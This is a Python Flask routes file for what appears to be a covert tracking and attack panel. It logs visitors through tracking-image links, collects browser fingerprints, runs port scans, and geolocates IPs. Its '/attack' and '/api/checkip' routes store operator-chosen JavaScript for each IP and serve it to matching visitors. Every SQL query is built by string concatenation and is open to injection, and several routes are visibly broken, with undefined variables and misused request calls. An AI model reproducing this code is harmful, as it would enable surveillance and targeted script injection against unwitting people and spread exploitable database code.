# -*- encoding: utf-8 -*-
import html as htmlmodule
import os
from sqlite3.dbapi2 import connect
import ipaddress
from werkzeug.datastructures import ContentRange
from apps.home import blueprint
from flask import render_template, request, jsonify, redirect, url_for
from flask_login import login_required
from jinja2 import TemplateNotFound
from apps.home.offsec import *
from apps.home.asn import *
import sqlite3
import json
import urllib.request
from ua_parser import user_agent_parser
from flask import send_from_directory
import time
import string
import random
# import rsplit



@blueprint.route('/display/<filename>')
def display_image(filename):
	#print('display_image filename: ' + filename)
    # call db unique name
    ip = request.environ['REMOTE_ADDR']
    data={
    "ip":ip,
    "id":filename,
    "timestamp":str(time.time())
    }
    storeInTrackingTable(data)

    return redirect(url_for('static', filename='uploads/' + filename), code=301)



def getfromdb(table, columns, values):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    query = "SELECT * FROM " + table + " where "
    for i in range(0, len(columns)):
        if i == len(columns) - 1:
            query += columns[i] + " = '" + values[i] + "';"
        else:
            query += columns[i] + " = '" + values[i] + "' and "
    #print(query)
    cur.execute(query)
    rows = cur.fetchall()
    conn.close()
    return rows

def checkBookmarkDB(ip):
    try:
        conn = sqlite3.connect('db.sqlite3')
        cur = conn.cursor()
        s = "Select * from Fingerprints where ip = " + ip +" and bookmarked = 1 LIMIT 1;"
        cur.execute(s)
        rows = cur.fetchall()
        conn.close()
        return len(rows) == 1
    except:
        return False

def flagBookmarkDB(ip):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "UPDATE Fingerprints SET bookmarked = 1 where ip = " + ip +";"
    cur.execute(s)
    conn.close()

def storeIpCommentTable(ip, comment):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "CREATE TABLE IF NOT EXISTS TrackingComments ( ip TEXT, comments TEXT);"
    cur.execute(s)
    l = getfromdb('TrackingComments', ['ip'], ip)
    if len(l) == 0:
        s = "INSERT INTO TrackingComments (ip, comment) VALUES ('" + ip + "', '" + comment + "');"
        cur.execute(s)
        conn.commit()
    else:
        s = "UPDATE TrackingComments SET comment = '" + comment + "' WHERE ip = '" + ip + "';"
        cur.execute(s)
    conn.close()


def storeInDB(content):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "CREATE TABLE IF NOT EXISTS Fingerprints ( _id INTEGER PRIMARY KEY autoincrement,"
    col = ""
    bools = {}
    strs = {}
    ints = {}
    others = {}
    reals = {}
    for i in content:
        #print(i, ": ", content[i], " ", type(content[i]))
        col += i + ", "
        if isinstance(content[i], str):
            strs[i] = 1
            s += i + " TEXT, "
        elif isinstance(content[i], int):
            ints[i] = 1
            s += i + " INTEGER, "
        elif isinstance(content[i], float):
            reals[i] = 1
            s += i + " REAL, "
        elif isinstance(content[i], bool):
            if content[i] == False:
                content[i] = 0
            else:
                content[i] = 1 
            bools[i] = 1
            s += i + " INTEGER, "
        else:
            others[i] = 1
            content[i] = json.dumps(content[i])
            s += i + " BLOB, "
    colList = list(s)
    colList[-1] = ';'
    colList[-2] = ')'
    s = ''.join(colList)
    anotherList = list(col)
    anotherList = anotherList[: -2]
    col = ''.join(anotherList)
    #print(col)
    cur.execute(s)
    l = getfromdb("Fingerprints", ["clientID", "cookie", "ip"], [content["clientID"], content["cookie"], content["ip"]])
    if(len(l) == 0):
        #insert
        s = "INSERT INTO Fingerprints (" + col + ") VALUES ("
        for i in content:
            if i in strs:
                s += "'" + content[i] + "', "
            elif i in others:
                
                s += "'" + content[i] + "', "
            else:
                s += str(content[i]) + ", "
        colList = list(s)
        colList[-1] = ';'
        colList[-2] = ')'
        s = ''.join(colList)
        print(s)
        cur.execute(s)
        conn.commit()
        conn.close()
    else:
        s = "UPDATE Fingerprints SET "
        for i in content:
            if i == 'clientID' or i == 'cookie' or i == 'ip':
                print("Dont Change")
            elif i in strs:
                s += i + " = '" + content[i] + "', "
            elif i in others:
                s += i + " = '" + content[i] + "', "
            else:
                s += i + " = " + str(content[i]) + ", "
        colList = list(s)
        colList = colList[:-2]
        s = ''.join(colList)
        s += " where clientID = '" + content['clientID'] + "' and cookie = '" + content["cookie"] + "' and ip = '" + content["ip"] + "';"
        #print(s)
        cur.execute(s)
        conn.commit()
        conn.close()


def storeInTrackingTable(content):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "CREATE TABLE IF NOT EXISTS Tracking ("
    col = ""
    bools = {}
    strs = {}
    ints = {}
    others = {}
    reals = {}
    for i in content:
        #print(i, ": ", content[i], " ", type(content[i]))
        col += i + ", "
        if isinstance(content[i], str):
            strs[i] = 1
            s += i + " TEXT, "
        elif isinstance(content[i], int):
            ints[i] = 1
            s += i + " INTEGER, "
        elif isinstance(content[i], float):
            reals[i] = 1
            s += i + " REAL, "
        elif isinstance(content[i], bool):
            if content[i] == False:
                content[i] = 0
            else:
                content[i] = 1 
            bools[i] = 1
            s += i + " INTEGER, "
        else:
            others[i] = 1
            content[i] = json.dumps(content[i])
            s += i + " BLOB, "
    colList = list(s)
    colList[-1] = ';'
    colList[-2] = ')'
    s = ''.join(colList)
    anotherList = list(col)
    anotherList = anotherList[: -2]
    col = ''.join(anotherList)
    #print(col)
    cur.execute(s)
    #insert
    s = "INSERT INTO Tracking (" + col + ") VALUES ("
    for i in content:
        if i in strs:
            s += "'" + content[i] + "', "
        elif i in others:
            
            s += "'" + content[i] + "', "
        else:
            s += str(content[i]) + ", "
    colList = list(s)
    colList[-1] = ';'
    colList[-2] = ')'
    s = ''.join(colList)
    #print(s)
    cur.execute(s)
    conn.commit()
    conn.close()
    storeIpCommentTable(ip, '')

def storeInAttackingTable(content):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "CREATE TABLE IF NOT EXISTS Attacking ("
    col = ""
    bools = {}
    strs = {}
    ints = {}
    others = {}
    reals = {}
    for i in content:
        print(i, ": ", content[i], " ", type(content[i]))
        col += i + ", "
        if isinstance(content[i], str):
            strs[i] = 1
            s += i + " TEXT, "
        elif isinstance(content[i], int):
            ints[i] = 1
            s += i + " INTEGER, "
        elif isinstance(content[i], float):
            reals[i] = 1
            s += i + " REAL, "
        elif isinstance(content[i], bool):
            if content[i] == False:
                content[i] = 0
            else:
                content[i] = 1 
            bools[i] = 1
            s += i + " INTEGER, "
        else:
            others[i] = 1
            content[i] = json.dumps(content[i])
            s += i + " BLOB, "
    colList = list(s)
    colList[-1] = ';'
    colList[-2] = ')'
    s = ''.join(colList)
    anotherList = list(col)
    anotherList = anotherList[: -2]
    col = ''.join(anotherList)
    print(col)
    cur.execute(s)
    #insert
    l = getfromdb('Attacking', ['ip'], [content['ip']])
    if len(l) == 0: 
        s = "INSERT INTO Attacking (" + col + ") VALUES ("
        
        for i in content:
            if i in strs:
                s += "'" + content[i] + "', "
            elif i in others:
                
                s += "'" + content[i] + "', "
            else:
                s += str(content[i]) + ", "
        colList = list(s)
        colList[-1] = ';'
        colList[-2] = ')'
        s = ''.join(colList)
        #print(s)
        print(s)
        cur.execute(s)
        conn.commit()
        conn.close()
    else:
        s = "UPDATE Attacking SET "
        for i in content:
            if i == 'ip':
                print("Dont Change")
            elif i in strs:
                s += i + " = '" + content[i] + "', "
            elif i in others:
                s += i + " = '" + content[i] + "', "
            else:
                s += i + " = " + str(content[i]) + ", "
        colList = list(s)
        colList = colList[:-2]
        s = ''.join(colList)
        s += " where ip = '" + content['ip'] + "';"
        #print(s)
        cur.execute(s)
        conn.commit()
        conn.close()

def getJSWithThisIP(ip):
    conn = sqlite3.connect('db.sqlite3')
    cur = conn.cursor()
    s = "SELECT js from Attacking where ip = '" + str(ip) + "';"
    print(s)
    cur.execute(s)
    rows = cur.fetchall()
    print(rows[0][0])
    return str(rows[0][0])

@blueprint.route('/index')
@login_required
def index():

    return render_template('home/index.html', segment='index')

@blueprint.route('/dash')
@login_required
def dash():
    allData = {}
    try:
        conn = sqlite3.connect('db.sqlite3')
        cur = conn.cursor()

        cur.execute("SELECT COUNT(DISTINCT (ip)) as cnt FROM Fingerprints;")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['uniqueIP'] = data
        
        cur.execute("SELECT countryCode, COUNT( DISTINCT ip) as cnt FROM Fingerprints GROUP BY countryCode; ")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['countryCount'] = data

        cur.execute("SELECT COUNT ( DISTINCT parentDomain) as cnt FROM Fingerprints;")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['uniqueDomains'] = data
        
        cur.execute("SELECT parentDomain, COUNT( DISTINCT ip) as cnt FROM Fingerprints GROUP BY parentDomain; ")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['domainCount'] = data
        
        cur.execute("SELECT parentDomain, COUNT( DISTINCT ip) as cnt FROM Fingerprints where isVpnTime = 'true' GROUP BY parentDomain; ")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['distinctIp'] = data
        
        cur.execute("SELECT ip FROM Fingerprints WHERE bookmarked=1 ;")
        desc = cur.description 
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        allData['flaggedIp'] = data
        conn.close()
    except:
        print('Some error occured')
    return render_template('home/dashboard.html', segment='index', allData = allData)

@blueprint.route('/fdl')
@login_required
def fdl():
    allData = {}
    try:
        conn = sqlite3.connect('db.sqlite3')
        cur = conn.cursor()
        cur.execute("SELECT distinct(parentDomain) FROM Fingerprints;")
        desc = cur.description
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        pDomains = []
        for i in data:
            pDomains.append(i['parentDomain'])
            s = "SELECT ip, cookie, clientId, timestamp, bookmarked, userAgent, webdriver, timezone, isTor, isVpnTime, isVpnASN, countryCode, region, regionName, isp, lat, lon, city, country FROM Fingerprints where parentDomain ='" + i['parentDomain'] + "';"
            cur.execute(s)
            desc = cur.description
            column_names = [col[0] for col in desc]
            data1 = [dict(zip(column_names, row)) for row in cur.fetchall()]
            allData[i['parentDomain']] = data1
        allData['keyList'] = pDomains
        conn.close()
    except:
        print('No data')
    return render_template('home/fulldomainlist.html', segment='index', allData = allData)

@blueprint.route('/ipl')
@login_required
def ipl():
    allData = {}
    try:
        conn = sqlite3.connect('db.sqlite3')
        cur = conn.cursor()
        cur.execute("SELECT distinct(ip) FROM Fingerprints;")
        desc = cur.description
        column_names = [col[0] for col in desc] 
        data = [dict(zip(column_names, row)) for row in cur.fetchall()]
        ips = []
        for i in data:
            ips.append(i['ip'])
            s = "SELECT cookie, clientId, timestamp, bookmarked, userAgent, webdriver, timezone, isTor, isVpnTime, isVpnASN, countryCode, region, regionName, isp, lat, lon, city, country FROM Fingerprints where ip ='" + i['ip'] + "';"
            cur.execute(s)
            desc = cur.description
            column_names = [col[0] for col in desc]
            data1 = [dict(zip(column_names, row)) for row in cur.fetchall()]
            allData[i['ip']] = data1
        allData['keyList'] = ips
        conn.close()
    except:
        print('No data')
    return render_template('home/fulliplog.html', segment='index', allData = allData)


@blueprint.route('/<template>')
@login_required
def route_template(template):

    try:

        if not template.endswith('.html'):
            pass

        # Detect the current page
        segment = get_segment(request)

        # Serve the file (if exists) from app/templates/home/FILE.html
        return render_template("home/" + template, segment=segment)

    except TemplateNotFound:
        return render_template('home/page-404.html'), 404

    except:
        return render_template('home/page-500.html'), 500


# Helper - Extract current page name from request
def get_segment(request):

    try:

        segment = request.path.split('/')[-1]

        if segment == '':
            segment = 'index'

        return segment

    except:
        return None

@blueprint.route('/injection')
def injection():
    #request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    ip = request.environ['REMOTE_ADDR']
    return render_template('home/injection.html', segment='index', ip=ip)

@blueprint.route('/injection/post', methods=['POST'])
def injectionpost():
    content = request.json
    if checkBookmarkDB(content['ip']):
        content['bookmarked'] = 1
    storeInDB(content)
    #l = getfromdb(['ip'], [content['ip']])
    return render_template('home/page-404.html', segment='index'), 404

@blueprint.route('/search', methods=['GET','POST'])
def searchpost():
    if (request.method == 'POST'):
        search = request.form['search']
        print(search)
        isBad,asn,result=getDetails(search)
        print(isBad,asn)
        try:
            ips=[]
            conn = sqlite3.connect('db.sqlite3')
            cur = conn.cursor()
            cur.execute("Select cookie from Fingerprints where ip="+search)
            cookie=cur.fetchall()
            
            for e in cookie:
                cur.execute("Select ip from Fingerprints where cookie="+e)
                ips.append(cur.fetchall())
            
            cur.execute("Select clientID from Fingerprints where ip="+search)
            clientID=cur.fetchall()
            for e in clientID:
                cur.execute("Select ip from Fingerprints where clientID="+e)
                ips.append(cur.fetchall())
            conn.close()
            uip = list(set(ips))
            allData={}
            for ip in uip:
                cur.execute("Select cookie,clientID,openports,userafent,timestamp, isvpn,isTOR,vpnblabla from Fingerprints where clientID=" )
                allData[ip]=cur.fetchall()
        except:
            print("error")
        
        return render_template('home/search.html', segment='index', result=result, ip = search, asn = asn, bad = isBad)
    else:
        return render_template('home/search.html', segment='index')
    
@blueprint.route('/api/portscan', methods=['POST'])
def portscan():
    ip = request.form['ip']
    type = request.form['speed']
    if type=='top10':
        result = get_info(ip, top_10)
    if type=='top50':
        result = get_info(ip, top_50)
    if type=='top100':
        result = get_info(ip, top_100)

    return jsonify(result)


@blueprint.route('/api/vpnidentification/time', methods=['POST'])
def vpn_time():
    ip = request.form['ip']
    GEO_IP_API_URL  = 'http://ip-api.com/json/'

    req             = urllib.request.Request(GEO_IP_API_URL+ip)
    response        = urllib.request.urlopen(req).read()
    json_response   = json.loads(response.decode('utf-8'))

    # search in db for ip
    browser_timzone = ''

    if(json_response['timezone'] == browser_timzone):
        return jsonify("false")

    return jsonify("true")

@blueprint.route('/api/ip/identity', methods=['GET','POST'])
def ip_identity():
    if request.method == 'POST':
        ip = request.form['ip']
    else:
        ip = request.args['ip']
    GEO_IP_API_URL  = 'http://ip-api.com/json/'

    req             = urllib.request.Request(GEO_IP_API_URL+ip)
    response        = urllib.request.urlopen(req).read()
    json_response   = json.loads(response.decode('utf-8'))

    # search in db for ip
    browser_timzone = ''
    dict = {}
    try:
        dict["status"] = "successful"
        dict["lat"] = json_response["lat"]
        dict["lon"] = json_response["lon"]
        dict["regionName"] = json_response["regionName"]
        dict["region"] = json_response["region"]
        dict["city"] = json_response["city"]
        dict["zip"] = json_response["zip"]
        dict["country"] = json_response["country"]
        dict["countryCode"] = json_response["countryCode"]
        dict["isp"] = json_response["isp"]
        
    except:
        dict["status"] = "failed"

    return jsonify(dict)

@blueprint.route('/api/getDetailsFromUserAgent')
def getDetailsFromUserAgent():

    userAgent = request.form['user-agent']
    #userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
    parsed_string = user_agent_parser.Parse(userAgent)
    print(parsed_string)
    return jsonify(parsed_string)

@blueprint.route('/tracking', methods=['GET','POST'])
def uploadfiles():
    if(request.method == 'POST'):
        uploadf = request.files['inputfile']
        N = 7
        res = ''.join(random.choices(string.ascii_uppercase + string.digits, k = N))
        name =  str(res) + '.' + uploadf.filename.rsplit('.', 1)[1].lower()

        print(name)
        # name = request.form['outputfile'] + '.' + request.form['extension']
        if(uploadf):
            try:
                uploadf.save(os.path.join('webinterface/apps/static/uploads/', name))
            except:
                uploadf.save(os.path.join('apps/static/uploads/', name))

            # return redirect(url_for('download_file', name=name))
        print(name)


        return render_template('home/tracking.html', segment='index', uploadf=uploadf, name = name)
    else:
        return render_template('home/tracking.html', segment='index')


@blueprint.route('/api/vpnDetails')
def vpnDetails():
    conn = sqlite3.connect('ip-index.db')
    ip = request.environ['REMOTE_ADDR']
    ip='203.192.236.33'
    intip=int(ipaddress.ip_address(ip))
    cur=conn.cursor()
    print(ip,type(ip),intip,type(intip))
    s="SELECT * FROM blacklisted WHERE start ="+ ip.split(".")[0]+ " AND " + str(intip)+" between first AND last LIMIT 1"
    cur.execute(s)
    a=cur.fetchall()
    s="SELECT * FROM datacenters WHERE start ="+ ip.split(".")[0]+ " AND " + str(intip)+" between first AND last LIMIT 1"
    cur.execute(s)
    b=cur.fetchall()
    s="SELECT * FROM asns WHERE start ="+ ip.split(".")[0]+ " AND " + str(intip)+" between first AND last LIMIT 1"
    cur.execute(s)
    c=cur.fetchall()
    s="SELECT * FROM countries WHERE start ="+ ip.split(".")[0]+ " AND " + str(intip)+" between first AND last LIMIT 1"
    cur.execute(s)
    d=cur.fetchall()
    conn.close()
    print(a,b,c,d)
    return jsonify({"bl":a,"dc":b,"asn":c,"cn":d})



@blueprint.route('/api/checkip',methods=['GET','POST'])
def checkip_attack():
    ip = request.environ['REMOTE_ADDR'] 
    #db check 
    # status = checkindb_if_to_attack_or_not if yes get js for it
    js_to_supply = 'alert("attacked");'
    l = getfromdb('Attacking', ['ip'], [str(ip)])
    if len(l) == 0:
        return 'console.log("Not tracked");'
    else:
        js = getJSWithThisIP(ip)
        content = {}
        content['ip'] = ip
        content['js'] = js
        content['timestamp'] = str(time.time())
        storeInTrackingTable(content)
        return js

@login_required
@blueprint.route('/attack',methods=['GET','POST'])
def attack():
    if(request.method == 'POST'):
        if request.args('mode') == "add":
            # store a ip and js pair together , make it unique and overwrite
            IP = request.args('ipaddr')
            JS = request.args('jsoffsec')
            content = {}
            content['ip'] = IP
            content['js'] = JS
            storeInAttackingTable(content)
            return redirect("/attack", code=302)
        if request.args('mode') == "search":
            IP = request.args('ipaddr')
            # search for js respective to partivular ip
            getfromdb("Attacking",['ip',"js"],[content["ip"],content["js"]])
            return render_template('home/attack.html', segment='index', search = content)

    else:
        content = {}
        content['ip'] = '127.0.0.1'
        content['js'] = '()=>{console.log("Something");--#!@#$%^&*[]................'
        content['timestamp'] = ''
        # store a ip and js pair together , make it unique and overwrite
        storeInAttackingTable(content)
        #getfromdb("Attacking", ["ip","js"],[content["ip"],content["js"]])
        
        return render_template('home/attack.html', segment='index', alldetails = content)